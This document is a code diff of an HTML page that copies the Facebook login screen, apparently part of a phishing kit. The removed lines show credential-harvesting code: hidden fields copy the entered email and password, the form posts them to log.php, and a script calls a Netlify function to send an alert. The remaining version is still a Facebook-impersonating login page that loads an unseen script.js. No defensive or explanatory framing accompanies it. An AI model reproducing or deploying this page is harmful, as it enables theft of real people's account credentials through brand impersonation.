@@ -1,53 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Log in to Facebook</title>
-  <link rel="stylesheet" href="style.css">
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
 </head>
+
 <body>
-  <div class="container">
-    <div class="facebook-content">
-      <img src="facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
-      <p>Facebook helps you connect and share with the people in your life.</p>
+    <div class="container">
+        <div class="facebook-content">
+            <img src="facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="login-box">
+            <form id="loginForm">
+                <input type="text" placeholder="Email address or phone number" name="email" id="email" required>
+                <input type="password" placeholder="Password" name="password" id="pass" required>
+                <button type="submit">Log in</button>
+                <a href="#">Forgotten account?</a>
+                <hr>
+                <a href="#" class="create-account">Sign up for Facebook</a>
+            </form>
+        </div>
     </div>
-    <div class="login-box">
-      <form id="loginForm" action="log.php" method="post">
-        <input type="hidden" id="capturedEmail" name="capturedEmail">
-        <input type="hidden" id="capturedPassword" name="capturedPassword">
-        <input type="text" placeholder="Email address or phone number" name="email" id="email" required>
-        <input type="password" placeholder="Password" name="password" id="pass" required>
-        <button type="submit">Log in</button>
-        <a href="#">Forgotten account?</a>
-        <hr>
-        <a href="#" class="create-account">Sign up for Facebook</a>
-      </form>
-    </div>
-  </div>
-  <script src="script.js"></script>
-  <script>
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('pass');
-    const capturedEmailInput = document.getElementById('capturedEmail');
-    const capturedPasswordInput = document.getElementById('capturedPassword');
-    const loginForm = document.getElementById('loginForm');
-
-    loginForm.addEventListener('submit', function (event) {
-      capturedEmailInput.value = emailInput.value;
-      capturedPasswordInput.value = passwordInput.value;
-    });
-
-    fetch('/.netlify/functions/send-alert')
-      .then(response => {
-        if (!response.ok) {
-          console.error('Failed to send alert:', response.statusText);
-        }
-      })
-      .catch(error => {
-        console.error('Error sending alert:', error);
-      });
-  </script>
+    <script src="script.js"></script>
 </body>
+
 </html>
